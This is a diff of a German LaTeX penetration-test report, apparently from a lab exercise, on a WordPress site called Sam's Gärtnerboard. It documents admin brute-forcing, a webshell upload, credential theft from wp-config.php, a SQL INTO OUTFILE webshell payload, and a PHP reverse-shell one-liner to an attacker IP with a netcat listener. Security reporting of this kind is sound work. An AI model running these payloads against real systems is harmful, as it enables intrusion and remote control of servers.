@@ -10,7 +10,7 @@ Die Webanwendung ist eine Wordpress-Anwendung für Personen zum Austausch über
 \newpage
 
 \cvss{av=local, ac=high, pr=high, ui=required, s=unchanged, c=low, i=low, a=low}
-\cvssdescription{Etiam risus sapien, ornare at dui ut, semper eleifend arcu. In fermentum felis ut ornare convallis. Donec ultrices condimentum neque ut semper.}
+\cvssdescription{Brute-Force-Angriff auf das Login-Formular mit bekannten Nutzernamen und einer Passwortliste}
 
 \section{\makecvssbadge Sam's Gärtnerboard: Schwache Authentifizierung}
 \cvssaddtosummary{Sam's Gärtnerboard: Schwache Authentifizierung} 
@@ -19,20 +19,6 @@ Die Webanwendung ist eine Wordpress-Anwendung für Personen zum Austausch über
 Aus der Webanwendung sind bereits Nutzernamen bekannt. Mit einer Brute-Force Attacke auf den Admin Nutzer frodo kann ein Admin-Zugriff auf die Webanwendung erlangt werden. Mit diesem Zugang, kann das Plugin "Advanced File Manager" der Webanwendung hinzugefügt werden, was es ermöglicht eine PHP-Datei hochzuladen. In dieser PHP-Datei wird eine Webshell integriert, welche dann unter der URL \texttt{http://10.0.68.107/webshell.php} erreichbar ist. Mit dieser Webshell kann wieder eine Reverse Shell für den Angreifer erstellt werden.
 
 Dieser Webanwendung liegt eine Datenbank zugrunde welche auch kompromitiert werden kann. In der Datei \texttt{wp-config.php} können die Credentials für den Zugriff auf den Datenbankserver erlangt werden. Per SSH kann sich nun auf den Datenbankserver geschalten werden. Mit dem folgenden SQL-Befehl kann auch auf diesen Webserver eine Webshell hochgeladen werde, welche durch eine Reverse Shell mit dem Kommando ... umgewandelt werden kann.
-
-\begin{figure}[!ht]
-    \centering
-    \includegraphics[width=\linewidth]{images/proofs/03_sam_proof.png}
-    \caption{Proof für die Webanwendung Sam's Gärtnerboard}
-    \label{fig:03_sam_proof}
-\end{figure}
-
-\begin{figure}[!ht]
-    \centering
-    \includegraphics[width=\linewidth]{images/proofs/03_sam_db_proof.png}
-    \caption{Proof für die Datenbank zur Webanwendung Sam's Gärtnerboard}
-    \label{fig:03_sam_db_proof}
-\end{figure}
 
 \subsection*{Empfehlungen} Stärkere Passwort Richtlinien \cite{bsi_passwords}, Credentials für den Datenbankzugriff nicht als Klartext speichern, lieber verschlüsselt und als Key-Datei. Escaping von php code oder ähnlichem für die Datenbank. Verhindern von hinzufügen neuer Plugins, durch 2FA oder ähnlichem. Wordpress aktuelle Version verwenden, Plugins auch aktuell halten!
 
@@ -78,6 +64,13 @@ php -r '\$sock=fsockopen("10.0.32.2",9001);exec("/bin/sh -i <\&3 >\&3 2>\&3");'
 \label{listing:sams-gaertnerboard:reverse-shell}
 \end{listing}
 
+\begin{figure}[!ht]
+    \centering
+    \includegraphics[width=\linewidth]{images/proofs/03_sam_proof.png}
+    \caption{Proof für die Webanwendung Sam's Gärtnerboard}
+    \label{fig:03_sam_proof}
+\end{figure}
+
 \subsection*{Empfehlungen}
 Empfehlungen
 
@@ -110,6 +103,7 @@ Select '<?php system($_REQUEST["cmd"]); ?>' into outfile '/var/www/html/web-shel
 \caption{Webshell upload über SQL-Befehl}
 \label{listing:sams-gaertnerboard-db:webshell-sql}
 \end{listing}
+
 \subsection*{Empfehlungen}
 Empfehlungen
 
@@ -121,6 +115,14 @@ Empfehlungen
 
 \subsection*{Proof of concept}
 Über die hochgeladenen Webshell kann eine Reverse Shell initiiert werden. Dafür muss zunächst ein Netcat-Listener auf dem Angreifer-System mit dem Befehl \texttt{nc -lvp 9001} gestartet werden. Mit dem Befehl aus \autoref{listing:sams-gaertnerboard:reverse-shell} kann sich die Shell auf dem Netcat-Listener verbinden. 
+
+
+\begin{figure}[!ht]
+    \centering
+    \includegraphics[width=\linewidth]{images/proofs/03_sam_db_proof.png}
+    \caption{Proof für die Datenbank zur Webanwendung Sam's Gärtnerboard}
+    \label{fig:03_sam_db_proof}
+\end{figure}
 
 \subsection*{Empfehlungen}
 Empfehlungen
